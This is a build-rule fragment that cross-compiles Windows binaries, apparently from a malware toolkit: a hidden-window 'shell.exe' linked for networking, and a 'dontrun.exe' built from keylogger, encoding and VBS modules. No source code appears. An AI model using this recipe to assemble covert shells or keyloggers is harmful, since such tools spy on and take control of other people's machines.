w:
	x86_64-w64-mingw32-gcc winshell.c -o shell.exe -mwindows -lws2_32 -ladvapi32 -lshlwapi -s -static
	x86_64-w64-mingw32-windres resources.rc -O coff -o resources.res
	x86_64-w64-mingw32-gcc winmain.c resources.res libs/wheelswap.c libs/winencode.c libs/winkeylog.c libs/winvbs.c -I./libs -I. -o dontrun.exe -lcrypt32 -lws2_32 -mwindows -lbcrypt -luser32 -s -Os